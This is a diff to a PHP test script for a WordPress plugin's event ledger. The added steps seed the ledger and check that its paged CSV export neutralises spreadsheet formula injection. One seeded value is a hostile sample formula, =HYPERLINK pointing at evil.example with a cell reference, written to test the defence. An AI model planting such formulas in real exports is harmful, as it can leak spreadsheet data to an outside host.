@@ -4,7 +4,10 @@
  * install. Each step loads WordPress, exercises the plugin and exits non-zero
  * on the first failed assertion.
  *
- * Usage: php checks.php <wordpress-dir> <install|activate|flow|errors|availability|rum|teardown>
+ * Usage: php checks.php <wordpress-dir> <step> [csv-file]
+ *
+ * Steps: install, activate, flow, ledger_seed, ledger_csv, errors,
+ * availability, rum, teardown.
  */
 
 if ( 'cli' !== PHP_SAPI ) {
@@ -271,6 +274,58 @@ switch ( $step ) {
 		// The key stays set and the error stays recorded, so the screens and
 		// Site Health checked over HTTP next render the lab section and the
 		// failing lab test.
+		break;
+
+	case 'ledger_seed':
+		global $wpdb;
+		$util = Aftercare\Core\Util::class;
+		check( "'=1+1" === $util::csv_safe( '=1+1' ), 'csv_safe prefixes =' );
+		foreach ( array( '+1', '-1', '@SUM(A1)', "\tx", "\rx" ) as $cell ) {
+			check( "'" . $cell === $util::csv_safe( $cell ), 'csv_safe prefixes ' . wp_json_encode( $cell[0] ) );
+		}
+		check( 'Plain text' === $util::csv_safe( 'Plain text' ) && '' === $util::csv_safe( '' ) && 'a=1' === $util::csv_safe( 'a=1' ), 'csv_safe leaves other cells alone' );
+
+		// More rows than one export page, so the export has to page.
+		$table = $wpdb->prefix . 'aftercare_ledger_events';
+		$now   = Aftercare\Core\Util::now();
+		for ( $batch = 0; $batch < 11; $batch++ ) {
+			$values = array();
+			for ( $i = 0; $i < 100; $i++ ) {
+				$values[] = $wpdb->prepare( '( %s, %s, 0, %s, %s, %s )', 'settings_change', 'Compat seed ' . ( $batch * 100 + $i ), 'system', '{}', $now );
+			}
+			$wpdb->query( "INSERT INTO {$table} ( event_type, summary, actor_id, actor_label, payload, occurred_at ) VALUES " . implode( ', ', $values ) ); // phpcs:ignore WordPress.DB.PreparedSQL.InterpolatedNotPrepared
+		}
+		$wpdb->insert(
+			$table,
+			array(
+				'event_type'  => 'content_publish',
+				'summary'     => '=1+1',
+				'actor_id'    => 0,
+				'actor_label' => '@editor',
+				'payload'     => '=HYPERLINK("https://evil.example?"&A1,"Click")',
+				'occurred_at' => $now,
+			)
+		);
+		check( Aftercare\Core\Plugin::instance()->ledger()->count() > 1100, 'ledger seeded with more than one export page' );
+		break;
+
+	case 'ledger_csv':
+		global $wpdb;
+		$file   = $argv[3] ?? '';
+		$handle = fopen( $file, 'r' );
+		$rows   = array();
+		while ( $handle && false !== ( $row = fgetcsv( $handle, null, ',', '"', '' ) ) ) {
+			$rows[] = $row;
+		}
+		check( 'occurred_at' === ( $rows[0][0] ?? '' ), 'CSV export has its header row' );
+		check( count( $rows ) - 1 === Aftercare\Core\Plugin::instance()->ledger()->count(), 'CSV export streams every ledger row across pages' );
+		$formula = array_values( array_filter( $rows, static fn( $row ) => "'=1+1" === ( $row[2] ?? '' ) ) );
+		check( 1 === count( $formula ), "a summary of =1+1 exports as '=1+1" );
+		check( "'@editor" === $formula[0][3] && str_starts_with( $formula[0][4], "'=HYPERLINK(" ), 'actor and payload cells are made safe too' );
+		$unsafe = array_filter( array_merge( ...$rows ), static fn( $cell ) => '' !== $cell && str_contains( "=+-@\t\r", $cell[0] ) );
+		check( array() === $unsafe, 'no exported cell starts with a formula character' );
+
+		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i WHERE summary LIKE %s OR summary = %s', $wpdb->prefix . 'aftercare_ledger_events', 'Compat seed %', '=1+1' ) );
 		break;
 
 	case 'errors':
